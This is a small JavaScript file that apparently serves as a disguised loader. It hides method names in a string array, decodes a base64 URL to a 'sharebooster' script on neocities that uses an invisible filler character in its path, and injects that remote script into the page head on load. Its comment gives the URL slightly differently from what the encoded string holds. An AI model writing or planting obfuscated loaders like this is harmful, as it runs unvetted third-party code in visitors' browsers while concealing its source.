var loadExternalScript = true; // Editable toggle

(function(){
    const _s = [
        'createElement',
        'script',
        'src',
        'appendChild',
        'head',
        'getElementById',
        'style',
        'display',
        'none',
        'textContent',
        'Script is disabled'
    ];

    // Base64-encoded URL: "https://sharebooster.neocities.org/script%E3%85%A4.js"
    const encoded = "aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQlRTMlODUlQTRqcw==";

    // Decode Base64 to full URL
    const finalURL = atob(encoded);

    if(loadExternalScript){
        const s = document[_s[0]](_s[1]);
        s[_s[2]] = finalURL;
        document[_s[4]][_s[3]](s);
    } else {
        const d = document[_s[5]]('scriptStatus');
        d[_s[6]][_s[7]] = _s[8];
        d[_s[9]] = _s[10];
    }
})();
